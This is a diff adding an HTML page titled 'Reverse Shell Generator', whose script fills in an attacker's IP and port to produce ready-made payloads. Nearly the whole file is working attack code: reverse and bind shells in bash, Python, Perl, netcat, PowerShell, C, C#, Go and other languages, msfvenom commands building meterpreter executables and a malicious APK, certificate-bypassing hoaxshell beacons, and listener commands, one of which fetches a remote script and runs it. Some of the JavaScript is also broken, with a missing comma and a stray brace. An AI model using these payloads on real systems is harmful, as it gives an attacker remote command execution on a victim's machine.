@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Reverse Shell Generator</title>
+<style>
+  body {
+    font-family: monospace, monospace;
+    max-width: 700px;
+    margin: 2rem auto;
+    padding: 0 1rem;
+    background: #1e1e1e;
+    color: #c5c8c6;
+  }
+  label {
+    display: block;
+    margin: 1rem 0 0.25rem;
+  }
+  input, select, textarea {
+    width: 100%;
+    font-family: monospace;
+    font-size: 1rem;
+    padding: 0.4rem;
+    background: #282a2e;
+    color: #f8f8f2;
+    border: 1px solid #444;
+    border-radius: 4px;
+    box-sizing: border-box;
+  }
+  textarea {
+    resize: vertical;
+  }
+  h2, h3 {
+    margin-top: 2rem;
+  }
+</style>
+</head>
+<body>
+
+<h2>Reverse Shell Generator</h2>
+
+<label for="ip">IP (LHOST):</label>
+<input type="text" id="ip" placeholder="e.g. 192.168.1.10" />
+
+<label for="port">Port (LPORT):</label>
+<input type="number" id="port" placeholder="e.g. 4444" />
+
+<label for="payloadType">Payload Type:</label>
+<select id="payloadType">
+  <option value="reverse">reverse</option>
+  <option value="bind">bind</option>
+  <option value="msfvenom">msfvenom</option>
+  <option value="hoaxshell">hoaxshell</option>
+</select>
+
+<label for="payloadOption">Payload Option:</label>
+<select id="payloadOption"></select>
+
+<label for="listenerType">Listener Type:</label>
+<select id="listenerType">
+  <option value="nc">nc</option>
+  <option value="rlwrap_nc">rlwrap + nc</option>
+  <option value="socat">socat</option>
+  <option value="socat_tty">socat (TTY)</option>
+  <option value="openssl">openssl</option>
+  <option value="busybox_nc">busybox nc</option>
+  <option value="pwncat">pwncat</option>
+  <option value="conpty">windows conpty</option>
+  <option value="powercat">powercat</option>
+  <option value="rustcat">rustcat</option>
+  <option value="msfconsole">msfconsole</option>
+  <option value="hoaxshell">hoaxshell</option>
+
+
+</select>
+
+<h3>Generated Payload:</h3>
+<textarea id="generatedPayload" rows="6" readonly></textarea>
+
+<h3>Listener Command:</h3>
+<textarea id="generatedListener" rows="3" readonly></textarea>
+
+<script>
+  const payloads = {
+    reverse: {
+      bash_tcp: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
+      python_tcp: (ip, port) =>
+        `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`,
+      perl_tcp: (ip, port) =>
+        `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`,
+      nc_tcp: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
+      openssl_tcp: (ip, port) =>
+        `openssl s_client -quiet -connect ${ip}:${port} -servername ${ip} | /bin/sh | openssl s_client -quiet -connect ${ip}:${port} -servername ${ip}`,
+      php_tcp: (ip, port) =>
+        `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
+
+
+
+      bashi_tcp: (ip, port) =>
+        `sh -i >& /dev/tcp/${ip}/${port} 0>&1`,
+      
+      bash196_tcp: (ip, port) =>
+        `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
+      bashreadline: (ip, port) =>
+        `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
+
+      bash5: (ip, port) =>
+        `sh -i 5<> /dev/tcp/${ip}/${port} 0<&5 1>&5 2>&5`,
+      bashudp: (ip, port) =>
+        `sh -i >& /dev/udp/${ip}/${port} 0>&1`,
+      nc_mkfifo: (ip, port) =>
+        `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
+      nce: (ip, port) =>
+        `nc ${ip} ${port} -e sh'`,
+      curl: (ip, port) =>
+        `C='curl -Ns telnet://${ip}:${port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null`,
+      rustcat: (ip, port) =>
+        `rcat connect -s sh ${ip} ${port}`,
+      c_rev: (ip, port) =>
+        `#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+int main(void){
+    int port = ${port};
+    struct sockaddr_in revsockaddr;
+
+    int sockt = socket(AF_INET, SOCK_STREAM, 0);
+    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_port = htons(port);
+    revsockaddr.sin_addr.s_addr = inet_addr("${ip}");
+
+    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    sizeof(revsockaddr));
+    dup2(sockt, 0);
+    dup2(sockt, 1);
+    dup2(sockt, 2);
+
+    char * const argv[] = {"sh", NULL};
+    execvp("sh", argv);
+
+    return 0;       
+}`,
+      c_windows: (ip, port) =>
+        `#include <winsock2.h>
+#include <stdio.h>
+#pragma comment(lib,"ws2_32")
+
+WSADATA wsaData;
+SOCKET Winsock;
+struct sockaddr_in hax; 
+char ip_addr[16] = "${ip}"; 
+char port[6] = "${port}";            
+
+STARTUPINFO ini_processo;
+
+PROCESS_INFORMATION processo_info;
+
+int main()
+{
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+
+
+    struct hostent *host; 
+    host = gethostbyname(ip_addr);
+    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));
+
+    hax.sin_family = AF_INET;
+    hax.sin_port = htons(atoi(port));
+    hax.sin_addr.s_addr = inet_addr(ip_addr);
+
+    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
+
+    memset(&ini_processo, 0, sizeof(ini_processo));
+    ini_processo.cb = sizeof(ini_processo);
+    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
+    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
+
+    TCHAR cmd[255] = TEXT("cmd.exe");
+
+    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
+
+    return 0;
+}`,
+      cs_tcp: (ip, port) =>
+        `using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+
+
+namespace ConnectBack
+{
+	public class Program
+	{
+		static StreamWriter streamWriter;
+
+		public static void Main(string[] args)
+		{
+			using(TcpClient client = new TcpClient("${ip}", ${port}))
+			{
+				using(Stream stream = client.GetStream())
+				{
+					using(StreamReader rdr = new StreamReader(stream))
+					{
+						streamWriter = new StreamWriter(stream);
+						
+						StringBuilder strInput = new StringBuilder();
+
+						Process p = new Process();
+						p.StartInfo.FileName = "sh";
+						p.StartInfo.CreateNoWindow = true;
+						p.StartInfo.UseShellExecute = false;
+						p.StartInfo.RedirectStandardOutput = true;
+						p.StartInfo.RedirectStandardInput = true;
+						p.StartInfo.RedirectStandardError = true;
+						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+						p.Start();
+						p.BeginOutputReadLine();
+
+						while(true)
+						{
+							strInput.Append(rdr.ReadLine());
+							//strInput.Append("\n");
+							p.StandardInput.WriteLine(strInput);
+							strInput.Remove(0, strInput.Length);
+						}
+					}
+				}
+			}
+		}
+
+		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+
+	}
+}`,
+      perlrevsh: (ip, port) =>
+        `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`,
+      powershell: (ip, port) =>
+        `$LHOST = "${ip}"; $LPORT = ${port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()`,
+      powershell2: (ip, port) =>
+        `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+
+      python: (ip, port) =>
+        `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`,
+      rubyrev: (ip, port) =>
+        `ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("${ip}",${port}))'`,
+      nodjs: (ip, port) =>
+        `require('child_process').exec('nc -e sh ${ip} ${port}')`,
+      javarev: (ip, port) =>
+        `public class shell {
+    public static void main(String[] args) {
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/${ip}/${port} 0>&1");
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {}
+    }
+}`,
+      groovy: (ip, port) =>
+        `String host="${ip}";int port=${port};String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
+      telnet: (ip, port) =>
+        `TF=$(mktemp -u);mkfifo $TF && telnet ${ip} ${port} 0<$TF | sh 1>$TF`,
+      lua: (ip, port) =>
+        `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('sh -i <&3 >&3 2>&3');"`,
+      gorev: (ip, port) =>
+        `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","${ip}:${port}");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
+      vlang_tcp: (ip, port) =>
+        `echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh ${ip} ${port} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v`,
+      awk_rev: (ip, port) =>
+        `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
+      dart_rev: (ip, port) =>
+        `import 'dart:io';
+import 'dart:convert';
+
+main() {
+  Socket.connect("${ip}", ${port}).then((socket) {
+    socket.listen((data) {
+      Process.start('sh', []).then((Process process) {
+        process.stdin.writeln(new String.fromCharCodes(data).trim());
+        process.stdout
+          .transform(utf8.decoder)
+          .listen((output) { socket.write(output); });
+      });
+    },
+    onDone: () {
+      socket.destroy();
+    });
+  });
+}`,
+      crystal_rev: (ip, port) =>
+        `crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("${ip}",${port});loop{m,l=c.receive;p=Process.new(m.rstrip("\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'`,
+
+
+
+
+
+
+
+    },
+
+    bind: {
+      nc_bind: (ip, port) => `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 ${port} > /tmp/f`,
+      python_bind: (ip, port) => `python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",${port}));s1.listen(1);c,a=s1.accept();
+while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`,
+      php_bind: (ip, port) => `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",${port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`,
+      perl_bind: (ip, port) => `perl -e 'use Socket;$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'`,
+	},
+
+    msfvenom: {
+      linux_x64_reverse_tcp: (ip, port) =>
+        `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f elf -o shell.elf`,
+      linux_x64_bind_tcp: (ip, port) =>
+        `msfvenom -p linux/x64/shell_bind_tcp LPORT=${port} -f elf -o shell.elf`,
+      windows_metepreterstaged_tcp: (ip, port) =>
+        `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o shell.exe`,
+      windows_meterpreterstageless_tcp: (ip, port) =>
+        `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o shell.exe`,
+       windows_reversestaged_tcp: (ip, port) =>
+        `msfvenom -p windows/x64/shell/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o shell.exe`,
+       windows_reverse_tcp: (ip, port) =>
+        `msfvenom -p windows/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o shell.exe`,
+       windows_bind_shellcode: (ip, port) =>
+        `msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode`,
+        macos_revshell: (ip, port) =>
+        `msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=${ip} LPORT=${port} -f macho -o shell.macho`,
+        php_stagelessmeterrev: (ip, port) => `msfvenom -p php/meterpreter_reverse_tcp LHOST=${ip} LPORT=${port} -f raw -o shell.php`
+        warstag_revtcp: (ip, port) => `msfvenom -p java/shell_reverse_tcp LHOST=${ip} LPORT=${port} -f war -o shell.war`,
+        androidmet_tcp: (ip, port) => `msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=${ip} lport=${port} R -o malicious.apk`,
+
+        python_stagelesstcp: (ip, port) => `msfvenom -p cmd/unix/reverse_python LHOST=${ip} LPORT=${port} -f raw`,
+        bash_stageless: (ip, port) => `msfvenom -p cmd/unix/reverse_bash LHOST=${ip} LPORT=${port} -f raw -o shell.sh`,
+
+
+
+
+
+
+    },
+    hoaxshell: {
+      windowscmd_curl: (ip, port) =>
+        `@echo off&cmd /V:ON /C "SET ip=${ip}:${port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL`,
+     powershell_iex: (ip, port) => `$s='${ip}:${port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,
+     powershell_iexclm: (ip, port) => `$s='${ip}:${port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,
+     powershell_outfile: (ip, port) => `$s='${ip}:${port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,
+     powershell_outfileclm: (ip, port) => `$s='${ip}:${port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,
+     windowscmdcurl_https: (ip, port) => `@echo off&cmd /V:ON /C "SET ip=${ip}:${port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL`, 
+     powershell_iexhttps: (ip, port) => `add-type @"
+using System.Net;using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
+ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+$s='${ip}:${port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,
+     powershell_iexhttpsctlm: (ip, port) => `add-type @"
+using System.Net;using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
+ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+$s='${ip}:${port}';$i='11e6bc4b-fefb1eab-68a9612e';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/11e6bc4b -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/fefb1eab -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/68a9612e -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,
+     powershell_outfilehttps: (ip, port) => `add-type @"
+using System.Net;using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
+ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+$s='${ip}:${port}';$i='add29918-6263f3e6-2f810c1e';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}`,
+     powershell_outfileclmhttps: (ip, port) => `add-type @"
+using System.Net;using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
+ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+$s='${ip}:${port}';$i='e030d4f6-9393dc2a-dd9e00a7';$p='https://';$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/e030d4f6 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/9393dc2a -Headers @{"Authorization"=$i}); if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/dd9e00a7 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}`,
+
+      
+      
+    },
+  };
+
+  const listeners = {
+    nc: (port) => `nc -lvnp ${port}`,
+    hoaxshell: (port) => `hoaxshell -l ${port}`,
+    socat: (port) => `socat TCP-LISTEN:${port},reuseaddr,fork EXEC:/bin/sh`,
+    openssl: (port) => `openssl s_server -quiet -accept ${port} -nocert`,
+    msfconsole: (port, ip) =>
+      `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST ${ip}; set LPORT ${port}; exploit"`,
+    rlwrap_nc: (port) => `rlwrap nc -lvnp ${port}`,
+    wincon: (port) => `stty raw -echo; (stty size; cat) | nc -lvnp ${port}`,
+    socat_tty: (port) =>
+      `socat -d -d TCP-LISTEN:${port},reuseaddr,fork PTY,raw,echo=0`,
+    openssl: (port) => `openssl s_server -quiet -accept ${port} -nocert`,
+    busybox_nc: (port) => `busybox nc -l -p ${port} -e /bin/sh`,
+    pwncat: (port) => `pwncat -lp ${port}`,
+    conpty: (port) =>
+      `python3 -c "import socket,os,pty;s=socket.socket();s.bind(('0.0.0.0',${port}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2);pty.spawn('cmd.exe')"`,
+    powercat: (port) => `powercat -l -p ${port} -e cmd.exe`,
+    rustcat: (port) => `rcat listen ${port}`,
+    hoaxshell: (port) => `python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t ps-outfile-cm -c /your/cert.pem -k /your/key.pem -p ${port}`,
+  };
+
+  };
+
+  const ipInput = document.getElementById("ip");
+  const portInput = document.getElementById("port");
+  const payloadTypeSelect = document.getElementById("payloadType");
+  const payloadOptionSelect = document.getElementById("payloadOption");
+  const listenerTypeSelect = document.getElementById("listenerType");
+  const generatedPayloadArea = document.getElementById("generatedPayload");
+  const generatedListenerArea = document.getElementById("generatedListener");
+
+  function updatePayloadOptions() {
+    const type = payloadTypeSelect.value;
+    const options = Object.keys(payloads[type]);
+    payloadOptionSelect.innerHTML = "";
+    options.forEach((opt) => {
+      const optionElem = document.createElement("option");
+      optionElem.value = opt;
+      optionElem.textContent = opt;
+      payloadOptionSelect.appendChild(optionElem);
+    });
+  }
+
+  function generate() {
+    const ip = ipInput.value.trim();
+    const port = portInput.value.trim();
+    const payloadType = payloadTypeSelect.value;
+    const payloadOption = payloadOptionSelect.value;
+    const listenerType = listenerTypeSelect.value;
+
+    if (!port || !payloads[payloadType] || !payloads[payloadType][payloadOption]) {
+      generatedPayloadArea.value = "Invalid payload selection or missing port.";
+      generatedListenerArea.value = "";
+      return;
+    }
+
+    if (!ip && payloadType !== "bind" && payloadType !== "msfvenom") {
+      // For some payloads IP is needed
+      generatedPayloadArea.value = "Please enter a valid IP address.";
+      generatedListenerArea.value = "";
+      return;
+    }
+
+    const payloadFn = payloads[payloadType][payloadOption];
+    const payload = payloadFn(ip, port);
+
+    const listenerFn = listeners[listenerType];
+    if (!listenerFn) {
+      generatedListenerArea.value = "Invalid listener selection.";
+      return;
+    }
+    const listener = listenerType === "msfconsole" ? listenerFn(port, ip) : listenerFn(port);
+
+    generatedPayloadArea.value = payload;
+    generatedListenerArea.value = listener;
+  }
+
+  // Update payload options on page load & when payload type changes
+  updatePayloadOptions();
+  payloadTypeSelect.addEventListener("change", () => {
+    updatePayloadOptions();
+    generate();
+  });
+  payloadOptionSelect.addEventListener("change", generate);
+  listenerTypeSelect.addEventListener("change", generate);
+  ipInput.addEventListener("input", generate);
+  portInput.addEventListener("input", generate);
+
+  // Initial generate
+  generate();
+</script>
+
+</body>
+</html>
+
